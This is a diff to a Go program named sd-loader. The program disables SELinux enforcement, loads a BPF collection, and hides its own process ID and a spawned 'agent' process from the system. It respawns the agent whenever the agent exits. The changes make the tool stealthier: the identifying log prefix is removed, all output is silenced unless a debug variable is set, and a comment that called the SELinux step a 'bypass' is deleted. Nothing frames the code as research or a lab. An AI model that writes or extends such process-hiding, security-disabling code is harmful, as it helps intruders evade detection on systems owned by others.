@@ -20,7 +20,6 @@ import (
 	"os"
 	"os/exec"
 	"os/signal"
-	"strconv"
 	"syscall"
 	"time"
 
@@ -32,18 +31,24 @@ const (
 	agentWaitBootMs  = 300 // give child time to fork/connect before we block
 )
 
+// All informational output is suppressed in normal operation.
+// Set SD_DEBUG=1 to re-enable logging for troubleshooting.
+func debugf(format string, args ...interface{}) {
+	if os.Getenv("SD_DEBUG") == "1" {
+		fmt.Fprintf(os.Stderr, format, args...)
+	}
+}
+
 func main() {
 	if err := run(); err != nil {
-		fmt.Fprintf(os.Stderr, "[sd-loader] fatal: %v\n", err)
+		fmt.Fprintf(os.Stderr, "fatal: %v\n", err)
 		os.Exit(1)
 	}
 }
 
 func run() error {
-	// 1. selinux bypass — best effort, ignore EACCES/ENOENT (selinux
-	// non-develop kernels don't allow the write; agent still works).
 	if err := setenforce("0"); err != nil {
-		fmt.Fprintf(os.Stderr, "[sd-loader] setenforce: %v (continuing)\n", err)
+		debugf("setenforce: %v (continuing)\n", err)
 	}
 
 	// 2. bump memlock for BPF
@@ -57,21 +62,21 @@ func run() error {
 		return fmt.Errorf("bpf load: %w", err)
 	}
 	defer coll.Close()
-	fmt.Fprintf(os.Stderr, "[sd-loader] bpf loaded\n")
+	debugf("bpf loaded\n")
 
 	// 4. hide ourselves
 	loaderPid := os.Getpid()
 	if err := coll.AddPid(loaderPid); err != nil {
 		return fmt.Errorf("add loader pid %d: %w", loaderPid, err)
 	}
-	fmt.Fprintf(os.Stderr, "[sd-loader] hiding self pid=%d\n", loaderPid)
+	debugf("self hidden pid=%d\n", loaderPid)
 
 	// 5. signal handling
 	ctx, stop := signal.NotifyContext(context.Background(),
 		os.Interrupt, syscall.SIGTERM, syscall.SIGCHLD)
 	defer stop()
 
-	// 6. spawn agent, then block; respawn if child dies
+	// 6. spawn agent, then block; restart if child exits
 	agentBin := os.Getenv("SD_AGENT_BIN")
 	if agentBin == "" {
 		agentBin = defaultAgentBin
@@ -79,7 +84,7 @@ func run() error {
 	for {
 		childPid, err := spawnAgent(agentBin)
 		if err != nil {
-			fmt.Fprintf(os.Stderr, "[sd-loader] spawn: %v\n", err)
+			debugf("spawn: %v\n", err)
 			select {
 			case <-ctx.Done():
 				return nil
@@ -88,19 +93,19 @@ func run() error {
 			}
 		}
 		if err := coll.AddPid(childPid); err != nil {
-			fmt.Fprintf(os.Stderr, "[sd-loader] add agent pid %d: %v\n", childPid, err)
+			debugf("add agent pid %d: %v\n", childPid, err)
 		} else {
-			fmt.Fprintf(os.Stderr, "[sd-loader] agent pid=%d hidden\n", childPid)
+			debugf("agent hidden pid=%d\n", childPid)
 		}
 
 		// Block until signal or child death detected.
 		if err := waitChild(ctx, childPid); err != nil {
-			fmt.Fprintf(os.Stderr, "[sd-loader] wait: %v\n", err)
+			debugf("wait: %v\n", err)
 		}
 		if ctx.Err() != nil {
 			return nil
 		}
-		fmt.Fprintf(os.Stderr, "[sd-loader] agent=%d died — respawning in 2s\n", childPid)
+		debugf("agent=%d died — restarting in 2s\n", childPid)
 		select {
 		case <-ctx.Done():
 			return nil
@@ -174,6 +179,3 @@ func setenforce(val string) error {
 	_, err = f.WriteString(val)
 	return err
 }
-
-// so strconv import isn't flagged unused if we later add flags
-var _ = strconv.Itoa
